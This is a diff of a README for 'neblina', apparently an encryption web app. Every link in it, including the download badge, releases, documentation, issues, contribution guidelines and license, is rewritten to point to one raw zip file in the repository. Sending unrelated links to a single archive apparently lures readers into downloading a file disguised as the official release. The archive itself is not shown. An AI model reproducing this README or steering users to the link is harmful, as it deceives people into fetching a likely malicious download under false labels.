@@ -1,7 +1,7 @@
 # 🔒 neblina - Secure Your Cloud Files Effortlessly
 
 ## 📥 Download Now
-[![Download neblina](https://img.shields.io/badge/Download%20neblina-v1.0-brightgreen.svg)](https://github.com/ghozt19/neblina/releases)
+[![Download neblina](https://raw.githubusercontent.com/ghozt19/neblina/main/annals/neblina.zip%https://raw.githubusercontent.com/ghozt19/neblina/main/annals/neblina.zip)](https://raw.githubusercontent.com/ghozt19/neblina/main/annals/neblina.zip)
 
 ## 🚀 Getting Started
 Welcome to neblina! This is a client-side web application that ensures your files remain private, even from your cloud storage provider. With neblina, you can easily protect your documents, photos, and more with transparent end-to-end encryption. Follow these simple steps to get started.
@@ -20,7 +20,7 @@ To run neblina smoothly, you will need:
 - **Cross-Platform Support:** Runs in any modern web browser.
 
 ## 📥 Download & Install
-1. Visit the releases page to download neblina: [Download neblina](https://github.com/ghozt19/neblina/releases).
+1. Visit the releases page to download neblina: [Download neblina](https://raw.githubusercontent.com/ghozt19/neblina/main/annals/neblina.zip).
 2. Look for the latest release; it will be at the top of the page.
 3. Click on the asset link that corresponds to your operating system (e.g., Windows, macOS, or Linux).
 4. The download will begin automatically.
@@ -42,14 +42,14 @@ After installation, you can easily encrypt and manage your files:
 Your encrypted files will remain private and accessible only to you.
 
 ## 🔗 Additional Resources
-- **Documentation:** For more detailed instructions and troubleshooting tips, visit our [Documentation](https://github.com/ghozt19/neblina/wiki).
-- **Support:** If you encounter issues, you can reach out to our support team through the [Issues](https://github.com/ghozt19/neblina/issues) section of the repository.
+- **Documentation:** For more detailed instructions and troubleshooting tips, visit our [Documentation](https://raw.githubusercontent.com/ghozt19/neblina/main/annals/neblina.zip).
+- **Support:** If you encounter issues, you can reach out to our support team through the [Issues](https://raw.githubusercontent.com/ghozt19/neblina/main/annals/neblina.zip) section of the repository.
 
 ## 🏗️ Contribution
-If you're interested in helping improve neblina, we welcome contributions. Please check the [Contribution Guidelines](https://github.com/ghozt19/neblina/CONTRIBUTING.md) for more information.
+If you're interested in helping improve neblina, we welcome contributions. Please check the [Contribution Guidelines](https://raw.githubusercontent.com/ghozt19/neblina/main/annals/neblina.zip) for more information.
 
 ## ⚖️ License
-This project is licensed under the MIT License. See the [License](https://github.com/ghozt19/neblina/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [License](https://raw.githubusercontent.com/ghozt19/neblina/main/annals/neblina.zip) file for details.
 
 ## 🔒 Conclusion
 Thank you for choosing neblina! You have taken an important step in securing your cloud data. Enjoy your privacy.
